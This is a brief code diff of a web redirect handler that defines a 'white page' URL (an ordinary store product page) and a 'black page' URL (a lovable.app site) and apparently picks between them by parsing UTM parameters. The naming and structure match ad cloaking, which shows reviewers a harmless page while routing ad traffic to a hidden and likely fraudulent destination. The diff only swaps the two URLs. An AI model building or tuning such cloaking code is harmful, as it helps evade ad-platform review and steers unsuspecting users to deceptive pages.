@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.beyaly.com/?gad_source=1&gad_campaignid=22309687434&gbraid=0AAAAApylhvS0xPDiFIkMa7fR7dqBIdkj4&gclid=CjwKCAjwjffHBhBuEiwAKMb8pCHX0fR-n6PZLucJXSdRuHqPQgD3BPqfCx6bKiXDKuH1kq3OPnyIlxoC7CcQAvD_BwE";
-    const blackPageURL = "https://instentquzzz.lovable.app/";
+    const whitePageURL = "https://alarminglygood.com/products/black-embroidered-leather-cardholder?pr_prod_strat=e5_desc&pr_rec_id=4fc0f8233&pr_rec_pid=9626571735316&pr_ref_pid=9943760503060&pr_seq=uniform";
+    const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,5 +26,6 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
